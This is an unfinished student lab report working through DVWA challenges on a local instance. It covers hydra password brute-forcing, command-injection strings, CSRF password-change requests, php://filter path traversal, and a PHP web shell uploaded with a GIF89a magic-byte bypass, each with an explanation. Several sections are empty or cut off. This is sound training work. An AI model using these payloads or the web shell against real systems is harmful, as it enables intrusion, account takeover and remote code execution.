# DVWA Security Lab Report

## Brute Force
Reference: https://medium.com/@waeloueslati18/exploring-dvwa-a-walkthrough-of-the-brute-force-challenge-part-1-d38241ee81da
### Security Level: Low 
Payload: `username = admin' OR '1'='1` <br>
Result: Logged in <br>
Image:
![Brute-Force-Low](images/brute-force/brute-force-low.png)
Explanation why it worked: The source code does not do input sanitation so an SQL injection was possible. The OR '1'='1, makes it so that the internal login query no longer checks for a match in the password, just for a match in the username. <br>
Explanation why it failed at higher levels: They carry out input sanitation.<br>

### Security Level: Medium 
Approach: Use hydra to brute force common passwords from rockyou list via command:
`hydra -l admin -P resources/rockyou.txt -s 8080 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=oq786ppdqcpj74a6fq1ikg6c47;security=medium:F=Username and/or password incorrect."` <br>
Payload: `username = admin; password = password` <br>
Result: Logged in <br>
Image:
![Brute-force-med-hydra](images/brute-force/brute-force-med-hydra.png)
![Brute-force-med](images/brute-force/brute-force-med.png)
Explanation why it worked: The password was weak so it was in a list of common passwords which we could brute force. Moreover, the server let us make many attempts through one non-changing session ID so we could bruteforce. <br>
Explanation why it failed at higher levels: The random sleep/wait seems to cause some threads to not see the failure message + some fail due to Anti-CSRF checks not being handled properly by the Hydra command.<br>

### Security Level: High
Approach: Use hydra to brute force common passwords from rockyou list via command:
`hydra -l admin -P resources/rockyou.txt -t 1 -s 8080 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=oq786ppdqcpj74a6fq1ikg6c47;security=high:F=Username and/or password incorrect."`<br>
Payload: `username = admin; password = password` <br>
Result: Logged in <br>
Image:
![Brute-force-high-hydra](images/brute-force/brute-force-high-hydra.png)
![Brute-force-high](images/brute-force/brute-force-high.png)

Explanation why it worked: With one thread running, the random delay did not prevent us from differentiating between passing and failing passwords. <br>
Explanation why it failed at higher levels: It still seems to work.<br>

## Command Injection
### Security Level: Low 
Payload: `127.0.0.1; ls` <br>
Result: Able to run commands on system and via contents of filesystem. <br>
Image:
![Command-injection-low](images/command-injection/command-injection-low.png)
Explanation why it worked: The input was not being sanitised and run directly. Adding the semi-colon creates 2 separate commands, so the first one still pings and the second one does whatever we want it to. <br>
Explanation why it failed at higher levels: Input sanitation removes the `;` carried out.

### Security Level: Medium
Payload: `asda || ls` <br>
Result: Able to run commands on system and via contents of filesystem. <br>
Image:
![Command-injection-med](images/command-injection/command-injection-med.png)
Explanation why it worked: The `||` operator runs the second command only if the first fails. By providing an invalid input to ping (`asda`) we ensure it fails so that our custom follow-up command works. <br>
Explanation why it failed at higher levels: Input is properly sanitised and removes these operators too.

### Security Level: High
Payload: `|ls` <br>
Result: Able to run commands on system and via contents of filesystem. <br>
Image:
![Command-injection-high](images/command-injection/command-injection-high.png)
Explanation why it worked: The `| ` character had an extra space after. So if we just write it without space, it won't get replaced, allowing us to use it for command injection. <br>
Explanation why it failed at higher levels: The extra space issue was properly dealt. Actually, the input was checked to ensure that is numbers only.

## CSRF
### Security Level: Low 
Payload: `url: http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change#` <br>
Result: Able to change admin password through link <br>
Image:

![csrf-low](images/csrf/csrf-low.png)
Explanation why it worked: The API for password reset did not consider how it was being triggered. <br>
Explanation why it failed at higher levels: The API checks that it is being triggered by the same site. 

<!-- curl -A 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0' 'http://localhost:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change#' -->

### Security Level: Medium
Payload: `curl -v --referer "http://localhost:8080/vulnerabilities/csrf/" "http://localhost:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change#" -b "PHPSESSID=r0mns51mv27k5ot51g8fea50h1; security=medium"` <br>
Result: Password gets updated <br>
Image:
![csrf-med](images/csrf/csrf-med.png)
Explanation why it worked: We modif
Explanation why it failed at higher levels: 

<!-- ### Security Level: High
Payload: `|ls`
Result: Able to run commands on system and via contents of filesystem.
Image:
![Command-injection-high](images/command-injection/command-injection-high.png)
Explanation why it worked: The `| ` character had an extra space after. So if we just write it without space, it won't get replaced, allowing us to use it for command injection.
Explanation why it failed at higher levels: The extra space issue was properly dealt. Actually, the input was checked to ensure that is numbers only. -->

## File Inclusion
### Security Level: Low 
Payload: `url: http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/hackable/flags/fi.php` <br>
Result: Decoding the result (base64) we get PHP with the following quotes:
1. Bond. James Bond
2. My name is Sherlock Holmes. It is my business to know what other people don't know.
3. Romeo, Romeo! Wherefore art thou Romeo?
4. The pool on the roof must have a leak.
5. The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons. <br>

Image:![file-inc-low](images/file-inclusion/file-inc-low.png)
Explanation why it worked: Any file could be passed for inclusion and they would be run regardless. <br>
Explanation why it failed at higher levels: There were checks for certain file types

### Security Level: Medium
Payload: `http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//var/www/html/hackable/flags/fi.php`
Result: Hit the same php as before which gave the same quotes
Image: ![file-inc-med](images/file-inclusion/file-inc-med.png)
Explanation why it worked: The string was only replacing `../` pattern once, so if after replacing, a new `../` pattern forms, it would be processed.
Explanation why it failed at higher levels: There were more strict checks of paths, to specifically start with the term `file`, which means we also can't use filter.

### Security Level: High
Payload: `url: http://localhost:8080/vulnerabilities/fi/?page=file:///var/www/html/hackable/flags/fi.php`
Result: Can access quotes: 1, 2, 4, 5 via inspect element on the resulting page. Unable to access quote 3 as php can't be converted this time.
Image:
Image: ![file-inc-high](images/file-inclusion/file-inc-high.png)
Explanation why it worked: Browsers load files with `file:///` and since our target is a file, we can prepend this to the start of the path to access our target.
Explanation why it failed at higher levels: The impossible setup checks for exact match from list of files, now patterns, so no vulnerability.

## File Upload
### Security Level: Low 
Payload: Upload file `hack.php` with code:
```
<?php system($_REQUEST["cmd"]); ?>
```
And run by entering `url: http://127.0.0.1:8080/hackable/uploads/hack.php?cmd=ls /`
Result: We can execute any function we want. In this case, we get a list of files in the root folder
Image:
![file-up-low](images/file-upload/file-up-low.png)
Explanation why it worked: There are no checks on the file type so anything can be uploaded and then accessed later. <br>
Explanation why it failed at higher levels: They use checks on file content.

### Security Level: Medium
Payload: Upload a file `hack2.php` with same contents as before with: <br>
`curl -v -F "uploaded=@hack2.php;type=image/jpeg" -F "Upload=Upload" -b "PHPSESSID=r0mns51mv27k5ot51g8fea50h1; security=medium" http://localhost:8080/vulnerabilities/upload/`
Result: File uploaded and accessible/runnable at: `http://127.0.0.1:8080/hackable/uploads/hack2.php?cmd=ls%20/`
Image:
![file-up-med](images/file-upload/file-up-med.png)
Explanation why it worked: We are modifying the type in the HTTP request which tricks the server. <br>
Explanation why it failed at higher levels: It doesn't just check type as per HTTP request, but it also checks for image metadata.

### Security Level: High
Payload: We modify our php file to give a magic byte header which makes the server treat it as an image. In particular, we have `hack3.jpg` as:
```php
GIF89a;
<?php system($_REQUEST["cmd"]); ?>
```
Can be run on (low difficulty):
`url: http://localhost:8080/vulnerabilities/fi/?page=../../hackable/uploads/hack3.jpg&cmd=ls%20/`
Result: File uploaded successfully. Can not be triggered directly due to `.jpg` extension but can be triggered through file inclusion 
Image:
![file-up-high-upload](images/file-upload/file-up-high-upload.png)
![file-up-high](images/file-upload/file-up-high.png)
Explanation why it worked: The magic bytes make the php file look like a jpg file, giving a response on imagesize function, so the server accepts it as a valid file. <br>
Explanation why it failed at higher levels: It recasts the file to an image removing any artifical metadata.

## Insecure Captcha
### Security Level: Low 
Payload:
Result:
Image:
Explanation why it worked:
Explanation why it failed at higher levels:

### Security Level: Medium
Payload:
Result:
Image:
Explanation why it worked:
Explanation why it failed at higher levels:

### Security Level: High
Payload:
Result:
Image:
Explanation why it worked:
Explanation why it failed at higher levels:

## SQL Injection
### Security Level: Low 
Payload:
Result:
Image:
Explanation why it worked:
Explanation why it failed at higher levels:

### Security Level: Medium
Payload:
Result:
Image:
Explanation why it worked:
Explanation why it failed at higher levels:

### Security Level: High
Payload:
Result:
Image:
Explanation why it worked:
Explanation why it failed at higher levels:




## Security Analysis
1. Why does SQL Injection succeed at Low security?
2. What control prevents it at High?
3. Does HTTPS prevent these attacks? Why or why not?
4. What risks exist if this application is deployed publicly?
5. Map each vulnerability to its OWASP Top 10 category.


## Docker Inspection


## Bonus Setup
dvwa behind nginx proxy